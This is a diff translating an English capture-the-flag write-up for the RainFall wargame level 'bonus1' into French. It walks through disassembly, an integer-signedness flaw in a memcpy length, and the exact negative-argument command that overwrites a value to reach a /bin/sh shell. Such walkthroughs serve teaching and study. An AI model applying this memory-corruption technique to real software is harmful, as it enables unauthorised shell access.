@@ -1,6 +1,6 @@
-# Bonus 1
+# 11 - Trouve l'input 3
 
-- We login as user bonus1:
+- On se connecte en tant que bonus1:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
@@ -52,7 +52,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-- Let's highlight the most important parts of the program:
+- Voyons les parties les plus importantes du programme:
 ```
    0x0804842d <+9>:     mov    0xc(%ebp),%eax
    0x08048430 <+12>:    add    $0x4,%eax
@@ -65,7 +65,7 @@ End of assembler dump.
    0x08048448 <+36>:    mov    $0x1,%eax
    0x0804844d <+41>:    jmp    0x80484a3 <main+127>
 ```
->Convert the first argument of the program to an integer using `<atoi@plt>`, then compare it with the value 9. If it is greater, return.
+> `<atoi@plt>` le premier argument du programme, puis le compare à la valeur 9. Si il est plus grand, retourne.
 
 ```
    0x0804844f <+43>:    mov    0x3c(%esp),%eax
@@ -80,7 +80,7 @@ End of assembler dump.
    0x08048470 <+76>:    mov    %eax,(%esp)
    0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
 ```
->Copy n bytes into `[esp+0x14]` from the second argument of the program, where n is the result of atoi multiplied by 4.
+>Copie n octets dans `[esp+0x14]` à partir du deuxième argument du programme, où n est le résultat de atoi multiplié par 4.
 
 ```
    0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
@@ -92,9 +92,9 @@ End of assembler dump.
 ```
 >`0x8048583: "/bin/sh"`
 
->Subsequently, if the value at `0x3c(%esp)` is equal to 0x574f4c46 ("WOLF"), open a shell.
+> Si la valeur en `0x3c(%esp)` est égale à 0x574f4c46 ("WOLF"), ouvre un shell.
 
-- So, by providing a negative number as first argument, it allows us to write enough into memory to place 'WOLF' (backwards) at `0x3c(%esp)`:
+- En donnant un nombre négatif comme premier argument, cela nous permet d'écrire suffisamment dans la mémoire:
 ```
 bonus1@RainFall:~$ ./bonus1 -1073741800 abcdefghijklmnopqrstuvwxyzabcdefghijklmnFLOW
 
